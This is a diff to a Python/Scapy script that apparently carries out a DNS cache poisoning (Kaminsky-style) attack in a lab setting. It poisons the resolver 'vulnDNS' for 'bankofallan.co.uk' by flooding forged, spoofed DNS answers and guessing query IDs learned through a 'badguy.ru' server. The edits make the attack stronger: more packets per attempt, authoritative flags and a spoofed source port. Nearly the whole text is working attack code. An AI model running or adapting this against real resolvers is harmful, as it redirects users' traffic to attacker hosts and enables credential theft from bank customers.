@@ -37,7 +37,6 @@ LISTENER_HEADER = "[LISTENER_FLAG]: "
 MAIN_HEADER = "[MAIN]: "
 
 TARGET_IP = "192.168.56.101"  # vulnDNS's IP
-TARGET_PORT_REQUEST = 53  # target port for first vulnDNS's IP request
 
 BAD_DNS_SERVER_IP = "192.168.56.1"  # DNS endpoint IP of badguy.ru (also present on config.json)
 BAD_DNS_SERVER_PORT = 55553  # DNS endpoint port of badguy.ru (also present on config.json)
@@ -46,7 +45,7 @@ SPOOFED_DNS = "10.0.0.1"
 URL_TO_POISON = "bankofallan.co.uk"
 DNS_URL_BADGUY = "badguy.ru"
 
-NUMBER_OF_PACKETS = 50  # number of packets per attempt
+NUMBER_OF_PACKETS = 500  # number of packets per attempt
 TIME_SLEEP_SECONDS = 3  # seconds of delay before attack
 
 ATTACK_GOING_ON = True
@@ -90,8 +89,8 @@ def randomize_url(url_length=3):
     return "".join(choice(letters) for i in range(url_length)) + "."
 
 
-def random_query_id(last_query_id, seed=0):
-    last_query_id += randint(1, 500 + seed)
+def random_query_id(last_query_id, modifier=0):
+    last_query_id += randint(1, 500 + modifier)
     return last_query_id % 65536  # 16 bit maximum delimiter of query_id's DNS field
 
 
@@ -104,18 +103,18 @@ def bite_the_rat(target_port_sniffed, query_id):
     query_id = random_query_id(query_id, 50)  # after badguy.ru req we notice there's an increase of queryid
     for j in range(NUMBER_OF_PACKETS):
         # since we've to guess the new query id we define an incremental pseudo random generator
-        random_url = randomize_url(query_id % 6) + URL_TO_POISON
+        random_url = randomize_url(randint(1, 10)) + URL_TO_POISON
         guess_query_id = random_query_id(query_id)
         dns_record_req = DNSQR(qname=random_url, qtype="A")
-        dns_answer = DNSRR(rrname=random_url, type="A", ttl=60000, rclass="IN", rdata="192.168.56.1")
-        dns_malicious_req = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_REQUEST) / DNS(rd=1, qd=dns_record_req)
-        attack_res_packet = IP(src=SPOOFED_DNS, dst=TARGET_IP) / UDP(dport=target_port_sniffed) / DNS(id=guess_query_id,
-                                                                                                      qr=1,
-                                                                                                      aa=0,
-                                                                                                      ra=0,
-                                                                                                      rcode=0,
-                                                                                                      qd=dns_record_req,
-                                                                                                      an=dns_answer)
+        dns_answer = DNSRR(rrname=random_url, type="A", ttl=100, rclass="IN", rdata="192.168.56.1")
+        dns_malicious_req = IP(dst=TARGET_IP) / UDP(dport=53) / DNS(rd=1, qd=dns_record_req)
+        attack_res_packet = IP(src=SPOOFED_DNS, dst=TARGET_IP) / UDP(sport=53, dport=target_port_sniffed) / DNS(
+            id=guess_query_id,
+            qr=1,
+            aa=1,
+            ra=0,
+            qd=dns_record_req,
+            an=dns_answer)
         print(BITE_THE_RAT_HEADER + "Send malicious request # " + str(j) + "...")
         send(dns_malicious_req, verbose=0)
         send(attack_res_packet, verbose=0)
@@ -175,7 +174,7 @@ def main():
         print(MAIN_HEADER + "Sending first request to " + TARGET_IP +
               " asking for badguy.ru to get an initial queryId and port with our DNS")
         # rd = 1 means recursion desired
-        first_dns_req = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_REQUEST) / DNS(rd=1, qd=DNSQR(qname=DNS_URL_BADGUY))
+        first_dns_req = IP(dst=TARGET_IP) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=DNS_URL_BADGUY))
 
         send(first_dns_req, verbose=0)
         dns_badguy_thread.join()
